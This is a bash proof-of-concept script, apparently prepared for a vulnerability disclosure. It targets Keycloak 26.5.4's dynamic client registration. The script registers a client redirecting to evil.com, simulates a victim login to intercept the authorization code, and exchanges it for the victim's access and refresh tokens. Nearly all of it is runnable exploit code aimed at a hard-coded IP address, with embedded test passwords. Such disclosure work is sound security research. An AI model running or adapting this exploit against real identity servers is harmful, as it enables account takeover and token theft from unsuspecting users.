#!/usr/bin/env bash
# ==============================================================================
# PoC #6: Dynamic Client Registration Bypass — Auth Code Interception
# ==============================================================================
# Vulnerability: ANY authenticated realm user can register OIDC clients with
# arbitrary redirect_uris via DCR. The "Trusted Hosts" DCR policy only applies
# to anonymous registrations, not to authenticated (Bearer-token) registrations.
# This allows an attacker with a low-privilege account to intercept auth codes
# from any other realm user.
#
# Root Cause: Trusted Hosts policy is in "anonymous" subType only.
#             The "authenticated" subType has no host/URI restriction policy,
#             allowing arbitrary redirect_uris from any authenticated user.
#
# Impact: HIGH — complete auth code interception → victim token theft
# CVSS:   8.0 (High) — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
# Affected: Keycloak 26.5.4 (default DCR policy configuration)
# ==============================================================================

KC="${KC:-http://46.101.162.187:8080}"
REALM="test"

echo "=== PoC #6: DCR Client Registration Bypass → Auth Code Interception ==="
echo "Target: $KC/realms/$REALM"
echo ""

# STEP 1: Attacker gets a token (any low-privilege user account)
echo "[+] Step 1: Attacker obtains Bearer token (low-privilege account)"
ATTACKER_TOKEN=$(curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

if [ -z "$ATTACKER_TOKEN" ] || [ "$ATTACKER_TOKEN" = "None" ]; then
  echo "    [!] Failed to obtain attacker token"
  exit 1
fi
echo "    Attacker token obtained (testuser / low-privilege)"

# STEP 2: Register malicious client with evil.com redirect (no Trusted Hosts check for authenticated mode)
echo ""
echo "[+] Step 2: Register malicious OIDC client with attacker redirect URI"
echo "    NOTE: 'Trusted Hosts' policy only applies to anonymous DCR, not authenticated."
REG_RESP=$(curl -s -X POST "$KC/realms/$REALM/clients-registrations/openid-connect" \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Legitimate Looking App",
    "redirect_uris": ["https://evil.com/steal"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')

MALICIOUS_CLIENT_ID=$(echo "$REG_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['client_id'])" 2>/dev/null)
MALICIOUS_SECRET=$(echo "$REG_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['client_secret'])" 2>/dev/null)

if [ -z "$MALICIOUS_CLIENT_ID" ]; then
  echo "    [!] Registration failed: $REG_RESP"
  exit 1
fi

echo "    [+] Malicious client registered successfully (NO admin approval required)"
echo "    Client ID:     $MALICIOUS_CLIENT_ID"
echo "    Client secret: $MALICIOUS_SECRET"
echo "    Redirect URI:  https://evil.com/steal  (ATTACKER CONTROLLED)"

# STEP 3: Build the phishing auth URL
echo ""
echo "[+] Step 3: Attacker crafts malicious auth URL"
MALICIOUS_URL="$KC/realms/$REALM/protocol/openid-connect/auth?client_id=$MALICIOUS_CLIENT_ID&response_type=code&redirect_uri=https://evil.com/steal&scope=openid+profile+email"
echo "    URL: $MALICIOUS_URL"
echo "    (Victim sees legitimate Keycloak login page — trusted domain, looks safe)"

# STEP 4: Simulate victim clicking the link and logging in
echo ""
echo "[+] Step 4: Simulating victim clicking link and logging in"
VICTIM_COOKIES="/tmp/poc6_victim_cookies.txt"
rm -f "$VICTIM_COOKIES"

AUTH_PAGE=$(curl -si -c "$VICTIM_COOKIES" \
  "$KC/realms/$REALM/protocol/openid-connect/auth?client_id=$MALICIOUS_CLIENT_ID&response_type=code&redirect_uri=https://evil.com/steal&scope=openid+profile+email" 2>&1)
ACTION_URL=$(echo "$AUTH_PAGE" | grep -oP 'action="([^"]+)"' | head -1 | sed 's/action="//;s/"//')

if [ -z "$ACTION_URL" ]; then
  echo "    [!] Could not get login form action URL"
  exit 1
fi

VICTIM_RESP=$(curl -si -c "$VICTIM_COOKIES" -b "$VICTIM_COOKIES" \
  -X POST "$ACTION_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=victim&password=Password123&credentialId=" 2>&1)

REDIRECT_LOCATION=$(echo "$VICTIM_RESP" | grep -oP 'Location: ([^\r\n]+)' | head -1 | sed 's/Location: //')
AUTH_CODE=$(echo "$REDIRECT_LOCATION" | grep -oP 'code=([^&]+)' | sed 's/code=//')

if [ -z "$AUTH_CODE" ]; then
  echo "    [!] Auth code not captured"
  echo "    Redirect: $REDIRECT_LOCATION"
  exit 1
fi

echo "    [!!!] Victim redirected to evil.com with auth code:"
echo "    https://evil.com/steal?code=${AUTH_CODE:0:30}..."
echo "    Attacker's server captures the code!"

# STEP 5: Exchange code for victim tokens
echo ""
echo "[+] Step 5: Attacker exchanges stolen code for victim tokens"
TOKEN_RESP=$(curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=$MALICIOUS_CLIENT_ID&client_secret=$MALICIOUS_SECRET&grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=https://evil.com/steal")

echo "$TOKEN_RESP" | python3 -c "
import sys,json,base64

d = json.load(sys.stdin)
if 'error' in d:
    print('    [!] Token exchange failed:', d)
    sys.exit(1)

at = d['access_token']
payload = at.split('.')[1]
payload += '=' * (4 - len(payload) % 4)
claims = json.loads(base64.b64decode(payload))

print()
print('    [!!!] ATTACK SUCCESSFUL — VICTIM TOKENS STOLEN:')
print(f'    username:      {claims.get(\"preferred_username\")}')
print(f'    email:         {claims.get(\"email\")}')
print(f'    user_id:       {claims.get(\"sub\")}')
print(f'    roles:         {claims.get(\"realm_access\",{}).get(\"roles\",[])}')
print(f'    scope:         {d.get(\"scope\")}')
print(f'    access_token:  {at[:60]}...')
print(f'    refresh_token: {d.get(\"refresh_token\",\"\")[:60]}...')
print()
print('    Attacker now has persistent access to victim account!')
"

echo ""
echo "=== Attack Complete ==="
echo ""
echo "ROOT CAUSE: DCR 'Trusted Hosts' policy is scoped to 'anonymous' subtype only."
echo "            Authenticated DCR has no host/URI restriction — any Bearer token"
echo "            allows registering clients with arbitrary redirect_uris."
echo ""
echo "CVSS: 8.0 High — AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
